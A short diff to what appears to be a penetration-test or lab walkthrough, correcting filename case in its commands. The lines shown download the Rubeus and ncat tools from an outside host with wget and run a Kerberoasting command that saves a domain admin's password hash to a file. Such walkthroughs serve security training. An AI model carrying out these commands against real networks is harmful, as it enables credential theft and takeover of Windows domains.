@@ -831,7 +831,7 @@ cd ../.. ; cd Users\Public\Downloads
 ```
  we need to download 2 more executables
 ```
-wget http://10.10.1.13:8000/Rubeus.exe -o rebeus.exe
+wget http://10.10.1.13:8000/Rubeus.exe -o Rubeus.exe
 ```
 ```
 wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
@@ -845,7 +845,7 @@ cd ../.. ; cd Users\Public\Downloads
 ```
 
 ```
-rubeus.exe kerberoast /outfile:hash.txt
+Rubeus.exe kerberoast /outfile:hash.txt
 ```
 > after kerberoasting the hash of the DC Admin will be saved in hash.txt
 
